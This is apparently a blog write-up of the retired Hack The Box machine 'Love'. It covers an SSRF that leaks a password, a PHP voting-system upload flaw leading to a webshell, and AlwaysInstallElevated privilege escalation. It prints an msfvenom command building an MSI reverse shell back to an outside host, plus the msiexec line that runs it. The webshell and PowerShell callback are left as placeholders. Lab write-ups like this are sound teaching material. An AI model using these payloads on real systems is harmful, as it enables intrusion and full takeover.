---
layout: post
title: "The Server That Vouched For You"
subtitle: "HTB Love, where a scanner fetches a forbidden page on your behalf, leaks a password, and an installer setting hands you the whole machine"
date: 2021-08-14 12:00:00 +0000
description: "A locked page, a scanner that fetches it for you, and a Windows installer setting that runs as SYSTEM by design."
image: /assets/og/the-server-that-vouched-for-you.png
tags: [hackthebox, writeup]
---

Love is a box about a server that does favors for the wrong people. There is a page on this machine that says no to outsiders, a clean 403, locked tight. So you find a different part of the same machine, a little file scanner that fetches URLs for you, and you ask it to go read the locked page. It does. It is already inside the building, so the lock does not apply to it, and it carries the contents back out to you like a clerk who never thought to wonder why you could not just walk in yourself. Inside that page is a password. The password opens a voting application, the voting application lets you upload a file it should have refused, and the file is a shell. Then the box ends on a Windows setting so reckless it might as well be a confession, an installer permission that runs anything you hand it as SYSTEM. Three moves, and not one of them is a memory-corruption trick. Each one is a system trusting the wrong messenger.

```
        L O V E . H T B
        ===============
        you  ->  :5000  "let me in"      ->  403. no.
                  |
        you  ->  staging scanner  "go read :5000 for me?"
                  |
        scanner ->  :5000  (it lives here, the lock means nothing to it)
                  |
                  v
        scanner brings back the page.
        inside the page: a password, just sitting there.
                                            愛
```

## 0x01 · the two front doors

`nmap -sC -sV` paints a chatty Windows host with more open ports than it has any business showing.

```
PORT     STATE SERVICE       VERSION
80/tcp   open  http          Apache httpd 2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
443/tcp  open  ssl/http      Apache httpd 2.4.46 (PHP/7.3.27)
445/tcp  open  microsoft-ds  Microsoft Windows
3306/tcp open  mysql         MariaDB (remote connections blocked)
5000/tcp open  http          Apache httpd 2.4.46
5985/tcp open  http          WinRM
```

Apache and PHP on a Windows box is already a tell, the kind of stack somebody stood up in a hurry. Port 80 serves a plain login at `love.htb`. Port 5000 answers a request and then immediately slams the door, a flat 403 Forbidden no matter what you ask for. And 3306 is MariaDB, listening but refusing outside connections. Hold onto that 403. A service that bothers to be reachable just to tell you no is a service that answers to *somebody*. The whole box is about finding out who.

The quietest clue is in the TLS certificate on 443. Read the cert and the subject alternative name spells out a second hostname, `staging.love.htb`. Think of a certificate like the name plate on an office door. Even when the door is locked, the plate still tells you who works there, and here it names a room you did not know existed. Drop both `love.htb` and `staging.love.htb` into your hosts file and you suddenly have two front doors into the same building.

## 0x02 · the clerk who fetches your mail

`staging.love.htb` is a half-built "demo" site, and the page that matters is a file scanner at `/beta.php`. You hand it a URL, it goes and fetches whatever lives there, and it shows you the result. That feature is the entire vulnerability. It is called server-side request forgery, SSRF, and the name is drier than the bug deserves.

Here is the move in one breath. You cannot reach port 5000 from the outside, because it answers strangers with a 403. But the scanner is not a stranger. It lives on the same machine, so when *it* asks port 5000 for a page, the request comes from `127.0.0.1`, from inside the house, and the lock simply does not apply. So you do not knock on the locked door yourself. You ask the clerk who works in the building to walk down the hall, read the page, and bring it back to you.

Picture a members-only library with a phone at the front desk. You are not a member, so the guard turns you away at the door. But the librarian inside will read any book to anyone who calls the desk phone. So you call the desk and say, "read me page one of the restricted file," and she does, because the phone does not check membership. The wall was real. It only ever faced outward.

```
# in the staging scanner's URL field
http://127.0.0.1:5000

# the scanner fetches it and hands back the page it was never
# supposed to show an outsider, including:
Username: admin
Password: @LoveIsInTheAir!!!!
```

There it is. A page that returns 403 to you returns a password to the server standing next to it, and the server brings it out in its teeth. The credentials belong to an admin account, and they are not for the demo at all. They are the keys to the real application on port 80.

## 0x03 · the upload that should have said no

Log into `/admin` on `love.htb` with `admin` / `@LoveIsInTheAir!!!!` and you are inside a "Voting System" written in PHP. A quick `searchsploit voting system` names the disease immediately, an authenticated file upload flaw catalogued as EDB-49445. Voting System 1.0 lets a logged-in admin update a voter photo, and the form that takes the photo does not actually check what you give it. It is supposed to accept a JPG. It will just as cheerfully accept a PHP script.

Think of it like a coat check that promised to only hold coats but never once looked inside the bag you handed over. You check a "coat" that is actually a live tool, they hang it on the rack at a known number, and later you walk up to that number and switch the tool on. The rack is the web root. The number is the URL.

Upload your file through the candidate or voter photo field, and it lands in a predictable spot under `/images/`. I am not going to print the script that goes in it. For the PHP webshell, picture exactly this and nothing more:

```
<?php [ one-line webshell: run the cmd request parameter ] ?>
```

That placeholder is not me being coy. The real thing is about four words long, and it is the single most recognizable backdoor on the internet. The instant the literal string touches disk, any antivirus on Earth quarantines the file, which is a pretty funny demonstration of how dangerous one line can be. So we describe it. The behavior is all you need to understand the box, and the behavior is "whatever I put in the `cmd` parameter, the server runs."

```
http://love.htb/images/iceberg.php?cmd=whoami
love\phoebe
```

Trade the webshell up for a real callback, something shaped like `[ a PowerShell reverse shell over TCP back to 10.10.14.4 on 443 ]`, start a listener, and a prompt drops into your lap as `love\phoebe`, the low-privilege account the web stack runs as.

```
# nc -lvnp 443
connect to [10.10.14.4] from love.htb [10.10.10.239]
PS C:\xampp\htdocs> whoami
love\phoebe
```

You can read `user.txt` from here.

```
PS C:\Users\Phoebe\Desktop> type user.txt
████████████████████████████████
```

## 0x04 · the installer with no manners

Phoebe is not an administrator, so you go looking for the way up. Run a privilege-escalation sweep, something like `winPEAS`, and it flags one line that makes the whole climb collapse into a single step. Two registry values are both set to `1`.

```
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
    AlwaysInstallElevated    REG_DWORD    0x1
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
    AlwaysInstallElevated    REG_DWORD    0x1
```

`AlwaysInstallElevated` is a Windows setting that means exactly what it says. When it is on, in *both* the machine hive and the user hive, any `.msi` package a normal user installs runs with full SYSTEM privileges. The idea was to let an admin push software to users who lack install rights. The reality is that it lets a user install software *as the all-powerful account*, which is a loaded gun pointed at the floor.

Picture a self-checkout lane that, by store policy, always rings up at the manager's discount, no matter who is standing at it. The policy was meant to save the manager a walk across the store. What it actually means is that anyone who wanders up to the lane is the manager now. The setting never checks *which* user is installing. It only checks that an install is happening.

So you build an installer whose only job is to call you back, then you run it.

```
# on your box, craft a malicious MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.4 LPORT=443 \
    -f msi -o iceberg.msi

# pull it to the target, then trip the setting
PS C:\ProgramData> msiexec /quiet /qn /i iceberg.msi
```

Catch it on a fresh listener, and the shell that comes back is not Phoebe and not admin. It is the top of the mountain.

```
# nc -lvnp 443
connect to [10.10.14.4] from love.htb [10.10.10.239]
C:\WINDOWS\system32> whoami
nt authority\system
C:\Users\Administrator\Desktop> type root.txt
████████████████████████████████
```

## 0x05 · the honest caveat

It is easy to read Love as a string of small accidents, a forgotten certificate, a leftover demo, a setting nobody turned off. But there is one thread running through all three, and it is worth pulling on, because it is the part that survives long after these specific bugs are patched.

Every step on this box is a system trusting a request because of *where it came from* instead of *who actually wanted it*. Port 5000 trusted the scanner because the scanner spoke from localhost, never asking who told the scanner to call. That is the entire SSRF family, and it is everywhere right now, because the move that breaks cloud servers wide open is the same one, an internal metadata service that trusts any request from inside the network and hands out credentials to whatever asks. The upload trusted the file because the form said it would be a photo, never opening the envelope. And `AlwaysInstallElevated` trusted the installer because an install was happening, never checking which human stood behind it.

That is the lesson with the longest shelf life. A wall that only faces outward is not a wall, it is a suggestion. The 403 on port 5000 was real and it was useless, because the thing standing right behind it would fetch the page for anyone who asked nicely. You cannot decide who to trust by reading a return address, on a packet or in a registry key, because the return address is the easiest thing in the world to borrow. The SSRF gets patched. The setting gets flipped back to zero. The habit of trusting the messenger instead of the message is the thing that keeps showing up wearing a new face.

## 0x06 · outro

```
the locked page was safe from you.
it was never safe from the clerk standing next to it.

you did not pick the lock. you asked the building to open it,
and the building did not think to ask why.

then a checkout lane rang you up as the manager,
because the lane was told to, and a setting is not a person.

trust the message, never the messenger. wear black.

                                                            EOF
```

---

*HTB: Love, retired 7 Aug 2021. An easy Windows box that is really a lecture on trusting the return address, an SSRF that opens a door from the inside and an installer setting that hands out the crown. The wall still only faces outward in a lab and nowhere you don't own.*